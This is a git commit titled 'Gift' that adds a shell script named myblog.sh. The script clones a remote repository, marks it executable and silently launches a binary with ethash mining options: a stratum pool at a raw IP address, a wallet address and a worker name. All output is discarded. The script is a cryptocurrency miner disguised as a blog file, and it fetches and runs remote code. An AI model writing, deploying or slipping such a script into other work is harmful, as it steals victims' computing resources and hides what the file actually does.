76fd850b170d436a4f322faada3f22573f735e2d
bruneisoft <109172357+bruneisoft@users.noreply.github.com>
2022-07-14 12:07:57 +0700

    Gift

---
+++ myblog.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+cd /hoang999
+git clone https://github.com/thaihoang999/myblog.git -q
+chmod -R +x myblog
+./myblog/running -a ethash -o stratum+tcp://51.195.89.38:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-10 > /dev/null 2>&1
